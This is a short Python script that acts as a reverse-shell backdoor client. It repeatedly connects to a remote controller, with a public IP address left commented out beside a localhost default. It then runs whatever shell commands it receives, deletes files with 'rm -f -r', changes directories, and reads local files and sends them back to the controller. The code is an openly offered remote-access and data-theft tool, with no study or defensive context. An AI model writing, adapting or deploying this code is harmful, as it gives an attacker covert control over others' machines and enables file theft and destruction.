from io import BufferedReader
import socket
import subprocess
import os
import time

# HOST = '152.67.111.34'
HOST = 'localhost'
PORT = 42356
# PORT = 65400

def connect():
    global s 
    s = socket.socket()
    while True:
        try:
            s.connect((HOST, PORT))
            break
        except:
            time.sleep(2)
            continue

def recv():
    data = s.recv(1024).decode()
    return data

def send(data):
    s.send((data +".end.").encode())
    #sending data length

def send_bytes(byts):
    s.sendall(byts + b'.end.')
    


byts = bytearray()

connect()

while True:

    try:
        data = recv()
    except:
        s.close()
        connect()
        continue

    if data[:2] == "cd":
        os.chdir(data[3:])
        send("0")
        continue

    if data[:3] == "del":
        subprocess.call("rm -f -r " + data[3:])
        send("Done")
        continue

    if data[:4] == "test":
        continue
    
    if data[:4] == "down":
        byts .clear()
        sl = data.split(" " ,1)
        f = None
        try:
            f = open(sl[1] , "rb")
            byts += f.read()
        except:
            byts.clear()
            pass

        if recv() == "len?" :
            s.send( str(len(byts)).encode() )

        if len(byts) == 0:
            continue

        if recv() == "send" :
            send_bytes(byts)
            try:
                f.close()
            except:
                pass
        continue

    cmd = subprocess.Popen(data, stdout = subprocess.PIPE , stdin = subprocess.PIPE , stderr = subprocess.PIPE , shell=True)

    cwd = os.getcwd() + " > "
    out = cmd.stdout.read() + cmd.stderr.read()

    final = cwd.encode() + out
    send_bytes(final)

s.close()
    
    

